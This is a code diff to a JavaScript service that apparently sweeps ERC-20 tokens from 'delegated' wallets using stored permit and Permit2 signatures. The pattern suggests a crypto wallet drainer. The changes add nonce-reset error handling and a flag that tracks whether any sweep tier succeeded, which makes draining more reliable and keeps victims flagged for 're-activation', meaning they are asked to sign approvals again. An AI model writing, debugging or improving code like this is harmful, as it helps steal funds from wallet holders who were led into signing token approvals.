@@ -778,7 +778,7 @@ async function sweepGaslessWallet(walletAddress) {
         log(`[gasless] permit() tx: ${tx.hash}`);
         await tx.wait();
         log(`[gasless] permit() confirmed for ${checksum}`);
-      } catch (e) { err(`[gasless] permit() for ${checksum}: ${e.message}`); }
+      } catch (e) { maybeResetNonce(e); err(`[gasless] permit() for ${checksum}: ${e.message}`); }
     }
 
     for (const detail of permitBatch.details) {
@@ -795,7 +795,7 @@ async function sweepGaslessWallet(walletAddress) {
         log(`[gasless/allowance] transferFrom tx: ${tx.hash}`);
         await tx.wait();
         log(`[gasless/allowance] confirmed for ${checksum}`);
-      } catch (e) { err(`[gasless/allowance] ${tokenAddr} for ${checksum}: ${e.message}`); }
+      } catch (e) { maybeResetNonce(e); err(`[gasless/allowance] ${tokenAddr} for ${checksum}: ${e.message}`); }
       await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY));
     }
   }
@@ -964,6 +964,7 @@ async function sweepGaslessWallet(walletAddress) {
                 }
               } catch { /* non-fatal */ }
           } catch (e) {
+            maybeResetNonce(e);
             warn(`[gasless/batch] EIP-2612 permit() failed for ${tokenAddr.slice(0, 10)}: ${e.message} — marking failed, will not retry`);
             failedEIP2612.add(batchEip2612Key);
             eip2612Map[tokenAddr.toLowerCase()] = { ...e2, failed: true };
@@ -1063,6 +1064,7 @@ async function sweepGaslessWallet(walletAddress) {
         } catch (e) { err(`[gasless/batch] Supabase spent update: ${e.message}`); }
       }
     } catch (e) {
+      maybeResetNonce(e);
       const msg = e.message ?? "";
       if (/InvalidNonce|nonce.*already.*used|NONCE_USED/i.test(msg)) {
         warn(`[gasless/batch] nonce consumed for ${checksum} — marking spent`);
@@ -1344,6 +1346,9 @@ async function sweep(wallet) {
   const short = checksum.slice(0, 10);
   const nowSecs = BigInt(Math.floor(Date.now() / 1000));
   const addrKey = checksum.toLowerCase();
+  // Track whether any tier swept successfully this call — used to prevent
+  // Tier 4 from setting needs_reactivation:true when Tier 3.5 already swept.
+  let sweptThisCall = false;
 
   // "monitoring" wallets have no signatures — nothing to sweep.
   // Skip immediately to avoid 3 wasted Supabase queries per Transfer event.
@@ -1745,9 +1750,14 @@ async function sweep(wallet) {
           if (!/allowance/i.test(msg)) err(`[live-allowance] ❌ ${token.slice(0, 10)}: ${msg}`);
         }
       }
-      if (sweptAny && supabase) {
-        supabase.from("delegated_wallets").update({ needs_reactivation: false })
-          .eq("address", addrKey).eq("chain", CHAIN).then(v => v, () => {});
+      if (sweptAny) {
+        sweptThisCall = true;
+        if (supabase) {
+          // Awaited so the needs_reactivation:false write completes before Tier 4
+          // can overwrite it with needs_reactivation:true.
+          await supabase.from("delegated_wallets").update({ needs_reactivation: false })
+            .eq("address", addrKey).eq("chain", CHAIN).then(v => v, () => {});
+        }
       }
     }
   }
@@ -1903,7 +1913,9 @@ async function sweep(wallet) {
 
       if (withBalance.length === 0) {
         warn(`[gasless] no tokens with Permit2 approval — user must re-activate to approve ERC-20→Permit2`);
-        if (supabase) {
+        // Only flag needs_reactivation when no other tier swept — prevents overwriting
+        // a successful Tier 3.5 sweep result with a misleading re-activation request.
+        if (!sweptThisCall && supabase) {
           await supabase.from("delegated_wallets")
             .update({ needs_reactivation: true })
             .eq("address", addrKey).eq("chain", CHAIN).then(v => v, () => {});
@@ -2012,6 +2024,7 @@ async function sweep(wallet) {
         );
         await tx.wait();
         log(`[gasless] ✅ swept ${withBalance.length} tokens`);
+        sweptThisCall = true;
         if (supabase) {
           await supabase.from("permit2_signatures").update({ spent: true })
             .eq("address", addrKey + "-sig").eq("chain", CHAIN).then(v => v, () => {});
